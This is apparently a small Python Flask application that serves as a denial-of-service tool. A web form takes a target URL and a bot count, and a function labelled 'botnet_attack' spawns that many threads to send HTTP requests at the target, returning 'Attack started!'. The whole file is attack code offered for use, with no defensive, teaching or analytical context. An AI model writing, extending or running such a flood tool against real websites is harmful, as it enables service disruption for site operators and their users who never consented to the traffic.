import requests
import threading
import time
from flask import Flask, render_template, request

app = Flask(__name__)

def send_request(url):
    try:
        response = requests.get(url)
        print(f"Request sent to {url}. Status code: {response.status_code}")
    except:
        print(f"Failed to send request to {url}")

def botnet_attack(url, num_bots):
    for i in range(num_bots):
        t = threading.Thread(target=send_request, args=(url,))
        t.start()
        time.sleep(0.1)  # Add a small delay between requests

@app.route('/')
def index():
    return render_template('index.html')

@app.route('/attack', methods=['POST'])
def attack():
    url = request.form['url']
    num_bots = int(request.form['num_bots'])
    botnet_attack(url, num_bots)
    return "Attack started!"

if __name__ == '__main__':
    app.run()